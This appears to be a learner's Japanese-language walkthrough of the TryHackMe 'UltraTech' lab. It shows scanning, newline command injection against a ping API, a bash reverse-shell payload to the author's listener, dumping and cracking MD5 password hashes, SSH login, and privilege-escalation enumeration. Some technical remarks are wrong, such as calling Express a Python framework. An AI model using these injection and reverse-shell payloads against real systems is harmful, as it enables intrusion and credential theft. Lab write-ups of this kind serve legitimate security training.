# TryHackMe - UltraTech
[hhttps://tryhackme.com/room/ultratech1](https://tryhackme.com/room/ultratech1)

## Target Info
- IP: 10.10.234.236
- OS: 

## 1. Enumeration

### nmap

```
sudo nmap -sV -O -p- 10.10.234.236

PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
8081/tcp  open  blackice-icecap
31331/tcp open  unknown
```

```
sudo nmap -sV -O -p31331 10.10.234.236

PORT      STATE SERVICE VERSION
31331/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 (98%), Linux 4.4 (97%), Linux 3.2 - 4.14 (96%), Linux 3.10 - 3.13 (96%), Linux 4.15 - 5.19 (95%), Linux 2.6.32 - 3.10 (95%), Linux 3.10 - 4.11 (94%), Linux 3.8 - 3.16 (93%), Linux 5.4 (93%), Android 9 - 10 (Linux 4.9 - 4.14) (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

```

### gobuster
- gobuster dir -u http://10.10.234.236:8081 -w common.txt http

```
Starting gobuster in directory enumeration mode
===============================================================
/auth                 (Status: 200) [Size: 39]
/ping                 (Status: 500) [Size: 1094]
```

#### /auth
- 認証のエンドポイント。loginとpasswordを入力って書いてある。多分パラメータ？
- 

#### /ping

```
TypeError: Cannot read property 'replace' of undefined
    at app.get (/home/www/api/index.js:45:29)
    at Layer.handle [as handle_request] (/home/www/api/node_modules/express/lib/router/layer.js:95:5)
    at next (/home/www/api/node_modules/express/lib/router/route.js:137:13)
    at Route.dispatch (/home/www/api/node_modules/express/lib/router/route.js:112:3)
    at Layer.handle [as handle_request] (/home/www/api/node_modules/express/lib/router/layer.js:95:5)
    at /home/www/api/node_modules/express/lib/router/index.js:281:22
    at Function.process_params (/home/www/api/node_modules/express/lib/router/index.js:335:12)
    at next (/home/www/api/node_modules/express/lib/router/index.js:275:10)
    at cors (/home/www/api/node_modules/cors/lib/index.js:188:7)
    at /home/www/api/node_modules/cors/lib/index.js:224:17
```

### gobuster2
- pythonのエラー。replace関数が使えないらしい。これも怪しい


```
gobuster dir -u http://10.10.234.236:31331 -w common.txt http

Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 295]
/.htaccess            (Status: 403) [Size: 300]
/.htpasswd            (Status: 403) [Size: 300]
/css                  (Status: 301) [Size: 321] [--> http://10.10.234.236:31331/css/]
/favicon.ico          (Status: 200) [Size: 15086]
/images               (Status: 301) [Size: 324] [--> http://10.10.234.236:31331/images/]
/index.html           (Status: 200) [Size: 6092]
/javascript           (Status: 301) [Size: 328] [--> http://10.10.234.236:31331/javascript/]
/js                   (Status: 301) [Size: 320] [--> http://10.10.234.236:31331/js/]
/robots.txt           (Status: 200) [Size: 53]
/server-status        (Status: 403) [Size: 304]
```

#### /images
- 画像フォルダ

#### /js
- /jsのファイル。認証系もここかも

#### /robots.txt と/utech_sitemap.txt

```
/
/index.html
/what.html
/partners.html
```

- /partners.htmlがログインページっぽい


### FTP

- lftp -u anonymous 10.10.104.75
- anonymousはいなさそう
- 何もなし

### ログインを試す

```
curl http://10.10.234.236:8081/auth?login=admin&password=admin
```
- Invalid credentials
- アクセスのやり方はこれであってそう
- 

- curl http://10.10.234.236:8081/auth?login=' OR 1=1 --&password=admin
- うまくいかず

### エラー分からの推測

- pythonのExpressでAPIを使ってそう
- そしてpingでエラーってことは、ping対象のIPを入力してないからエラーなのでは？
- そしてExplessはreq.app.ipで対象のIPを管理していて、
- IPのパラメータがないので、ある前提のreq.app.ipへのreplaceできない ってこと？
- つまり引数にip入れれば動きそう？

```
http://10.10.234.236:8081/ping?ip=127.0.0.1

PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data. 64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.018 ms --- 127.0.0.1 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 0.018/0.018/0.018/0.000 ms
```
- 返ってきた！
- Explessで中身でpingのシェルを作ってそれをサーバで実行してるって家庭の元、別のシェル実行できないか確認

```
http://10.10.234.236:8081/ping?ip=127.0.0.1;pwd

ping: 127.0.0.1pwd: Name or service not known
```

- うまく処理されてなさそう。127.0.0.1pwdがIPになってる
- ;がサニタイズされてる


```
http://10.10.234.236:8081/ping?ip=127.0.0.1%3B%20pwd
ping: pwd: Temporary failure in name resolution
```
- 空白と;を入れたけどうまくサニタイズされてpwdをIPとして認識してる

```
http://10.10.234.236:8081/ping?ip=127.0.0.1%0Aid
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data. 64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.015 ms --- 127.0.0.1 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 0.015/0.015/0.015/0.000 ms uid=1002(www) gid=1002(www) groups=1002(www)
```
- 開業を試してみると実行できた

### リバースシェル

- 攻撃ようでnc -lvnp 12345
```
http://10.10.234.236:8081/ping?ip=127.0.0.1%0Abash -i >& /dev/tcp/10.8.119.101/12345 0>&1
```
- できん

### DBファイルの中身
- lsしたらutech.db.sqliteがあったので、catで中身確認

```
http://10.10.234.236:8081/ping?ip=127.0.0.1%0Acat%20utech.db.sqlite

PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data. 64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.021 ms --- 127.0.0.1 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 0.021/0.021/0.021/0.000 ms SQLite format 3@ .,P zz��etableusersusersCREATE TABLE users ( login Varchar, password Varchar, type Int ) ���(Mr00tf357a0c52799563c7c7b76c1e7543a32)Madmin0d0ea5111e3c1def594c1684e3b9be84
```
- r00t f357a0c52799563c7c7b76c1e7543a32
- admin 0d0ea5111e3c1def594c1684e3b9be84

#### 解読
- hash化して
- john --wordlist=rockyou.txt hash.txt 

```
john --format=raw-md5 --wordlist=rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 128/128 SSE4.1 4x5])
Press 'q' or Ctrl-C to abort, almost any other key for status
n100906          (?)
1g 0:00:00:01 DONE (2025-06-08 08:56) 0.7092g/s 3719Kp/s 3719Kc/s 3719KC/s n101581d..n0rthw1ck
```

- パスワードは
  - r00t: n100906
  - admin: mrsheafy



### もう一度FTP


- lftp -u r00t,n100906 ftp://10.10.40.64
- lftp -u admin,mrsheafy ftp://10.10.40.64
- 反応なし

### SSH

- ssh admin@10.10.40.64
  - 反応なし
- ssh r00t@10.10.40.64
  - いけた

## 2. Exploitation

- 初期行動
```
r00t@ultratech-prod:~$ ls
r00t@ultratech-prod:~$ pwd
/home/r00t
r00t@ultratech-prod:~$ cd ..
r00t@ultratech-prod:/home$ ls
lp1  r00t  www
r00t@ultratech-prod:/home$ id
uid=1001(r00t) gid=1001(r00t) groups=1001(r00t),116(docker)
r00t@ultratech-prod:/home$ whoami
r00t
r00t@ultratech-prod:/home$ pwd
/home
r00t@ultratech-prod:/home$ 
```

- sudo -l
  - Sorry, user r00t may not run sudo on ultratech-prod.
  - sudoで設定されてるものはなし
- find / -user root -perm -u=s -type f 2>/dev/null

```
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/bin/newuidmap
/usr/bin/chfn
/usr/bin/traceroute6.iputils
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/newgidmap
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/sudo
/usr/bin/gpasswd
/bin/su
/bin/mount
/bin/ping
/bin/ntfs-3g
/bin/fusermount
/bin/umount
/snap/core/6350/bin/mount
/snap/core/6350/bin/ping
/snap/core/6350/bin/ping6
/snap/core/6350/bin/su
/snap/core/6350/bin/umount
/snap/core/6350/usr/bin/chfn
/snap/core/6350/usr/bin/chsh
/snap/core/6350/usr/bin/gpasswd
/snap/core/6350/usr/bin/newgrp
/snap/core/6350/usr/bin/passwd
/snap/core/6350/usr/bin/sudo
/snap/core/6350/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/6350/usr/lib/openssh/ssh-keysign
/snap/core/6350/usr/lib/snapd/snap-confine
/snap/core/6350/usr/sbin/pppd
/snap/core/6531/bin/mount
/snap/core/6531/bin/ping
/snap/core/6531/bin/ping6
/snap/core/6531/bin/su
/snap/core/6531/bin/umount
/snap/core/6531/usr/bin/chfn
/snap/core/6531/usr/bin/chsh
/snap/core/6531/usr/bin/gpasswd
/snap/core/6531/usr/bin/newgrp
/snap/core/6531/usr/bin/passwd
/snap/core/6531/usr/bin/sudo
/snap/core/6531/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/6531/usr/lib/openssh/ssh-keysign
/snap/core/6531/usr/lib/snapd/snap-confine
/snap/core/6531/usr/sbin/pppd
```
- /usr/bin/pkexecこれが怪しそう
- でも多分無理そう
- GUIからroot権限で実行する仕組みで、有名な脆弱性として、任意のコードを実行できてしまうものがあった
- pkexec bashを実行すると、rootとして実行する必要がありますって出たから、多分無理

#### crontab
- crontab -lも特になし。

### 今後の流れ
- ftpにログインする
- CMSでログインしてみてファイルの確認。そこの脆弱性から侵入
  - adminってなんのアカウント？FTPでもSSHでもない
  - さっきのパスをCMSで試すのはアリかも
- ls -la /home/：他のユーザーのホームが見えるか
- ~/.ssh/：他ユーザーの公開鍵、誤設定、id_rsa など
- find / -name "*.pub" 2>/dev/null：公開鍵の漏れ

```
ls -la /etc/ssh/ssh_host_*
-rw------- 1 root root  668 Mar 19  2019 /etc/ssh/ssh_host_dsa_key
-rw-r--r-- 1 root root  609 Mar 19  2019 /etc/ssh/ssh_host_dsa_key.pub
-rw------- 1 root root  227 Mar 19  2019 /etc/ssh/ssh_host_ecdsa_key
-rw-r--r-- 1 root root  181 Mar 19  2019 /etc/ssh/ssh_host_ecdsa_key.pub
-rw------- 1 root root  411 Mar 19  2019 /etc/ssh/ssh_host_ed25519_key
-rw-r--r-- 1 root root  101 Mar 19  2019 /etc/ssh/ssh_host_ed25519_key.pub
-rw------- 1 root root 1675 Mar 19  2019 /etc/ssh/ssh_host_rsa_key
-rw-r--r-- 1 root root  401 Mar 19  2019 /etc/ssh/ssh_host_rsa_key.pub
```
- 秘密鍵は見れないようになっている、公開鍵は見えて良いので問題ない

- cat /etc/passwd：ログイン可能ユーザー確認（/bin/bash あり）

```
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
lp1:x:1000:1000:lp1:/home/lp1:/bin/bash
mysql:x:111:113:MySQL Server,,,:/nonexistent:/bin/false
ftp:x:112:115:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
r00t:x:1001:1001::/home/r00t:/bin/bash
www:x:1002:1002::/home/www:/bin/sh
```

### CMSでログイン
- http://10.10.40.64:31331/partners.html
- 実行してみたらhttp://10.10.40.64:8081/auth?login=admin&password=mrsheafyこれ
- おそらくauthのAPIと連動

```
Restricted area
Hey r00t, can you please have a look at the server's configuration?
The intern did it and I don't really trust him.
Thanks!

lp1
```
- adminでログインしたところ、r00tに向けてlp1が設定の確認してと言ってる
- インターン生が信用できないかららしい
- 管理者とインターン生とそのメンターがいる？
- r00tでもログインしてみる
- http://10.10.40.64:8081/auth?login=r00t&password=n100906


#### 各ユーザの調査

```
home/lp1$ ls -la
total 36
drwxr-xr-x 5 lp1  lp1  4096 Mar 22  2019 .
drwxr-xr-x 5 root root 4096 Mar 22  2019 ..
-rw------- 1 lp1  lp1    22 Mar 22  2019 .bash_history
-rw-r--r-- 1 lp1  lp1   220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 lp1  lp1  3771 Apr  4  2018 .bashrc
drwx------ 2 lp1  lp1  4096 Mar 19  2019 .cache
drwx------ 3 lp1  lp1  4096 Mar 22  2019 .config
drwx------ 3 lp1  lp1  4096 Mar 19  2019 .gnupg
-rw-r--r-- 1 lp1  lp1   807 Apr  4  2018 .profile
-rw-r--r-- 1 lp1  lp1     0 Mar 19  2019 .sudo_as_admin_successful
```
- .sshはなし
- sudo_as_admin_successfulの実行履歴っぽいもの
- .bash_historyを確認。したいが権限鉄器にみれず

```
ls -la ../r00t/
total 32
drwxr-xr-x 4 r00t r00t 4096 Jun  8 00:23 .
drwxr-xr-x 5 root root 4096 Mar 22  2019 ..
-rw-r--r-- 1 r00t r00t  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 r00t r00t 3771 Apr  4  2018 .bashrc
drwx------ 2 r00t r00t 4096 Jun  8 00:06 .cache
drwx------ 3 r00t r00t 4096 Jun  8 00:06 .gnupg
-rw-r--r-- 1 r00t r00t  807 Apr  4  2018 .profile
-rw------- 1 r00t r00t  847 Jun  8 00:23 .viminfo
```
- viminfoは見る価値ありそう

```
ls -la ../www/
total 40
drwxr-xr-x   5 www  www  4096 Mar 22  2019 .
drwxr-xr-x   5 root root 4096 Mar 22  2019 ..
drwxr-xr-x   3 www  www  4096 Mar 22  2019 api
-rw-------   1 www  www     8 Mar 22  2019 .bash_history
-rw-r--r--   1 www  www   220 Apr  4  2018 .bash_logout
-rw-r--r--   1 www  www  3771 Apr  4  2018 .bashrc
drwx------   3 www  www  4096 Mar 22  2019 .emacs.d
drwxrwxr-x 164 www  www  4096 Mar 22  2019 .npm
-rw-r--r--   1 www  www   807 Apr  4  2018 .profile
-rw-rw-r--   1 www  www    73 Mar 22  2019 .selected_editor
```
- .bash_history あり → 中身が8バイトしかないが確認価値あり
- .emacs.d あり → Emacsを使っている

## 結論
- pwkkitの悪用も可能。githubからエクスプロイトコード持ってきて実行するとroot権限が奪える
  - pwnkitの悪用方法
  - https://medium.com/@rizzziom/ultratech-walkthrough-tryhackme-bb3fce718e73
- もしくはpsコマンドを実行するとdockerがroot権限で奪えることもわかる

## 4. Flags
